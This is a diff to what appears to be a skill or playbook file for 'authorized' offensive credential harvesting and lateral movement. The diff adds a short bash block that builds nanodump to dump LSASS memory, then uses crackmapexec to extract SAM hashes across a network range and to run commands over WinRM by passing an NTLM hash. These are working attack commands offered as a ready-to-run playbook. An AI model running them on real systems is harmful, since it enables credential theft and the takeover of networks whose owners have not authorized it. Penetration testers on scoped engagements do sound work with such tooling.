@@ -36,6 +36,13 @@ triggers:
 
 Cybersecurity playbook for authorized offensive credential harvesting and lateral network progression. Follows minimum-privilege footprint principles, strictly scoped rules of engagement, and non-destructive proof-of-concept execution standards.
 
+```bash
+git clone https://github.com/cube0x0/nanodump && cd nanodump && make
+./nanodump.x64.exe --write C:\Windows\Temp\lsass.dmp
+crackmapexec smb <target-cidr> -u <user> -p '<pass>' --sam
+crackmapexec winrm <target> -u <user> -H <ntlm-hash> -x "whoami /all"
+```
+
 ## When to Use
 
 **Trigger phrases:**
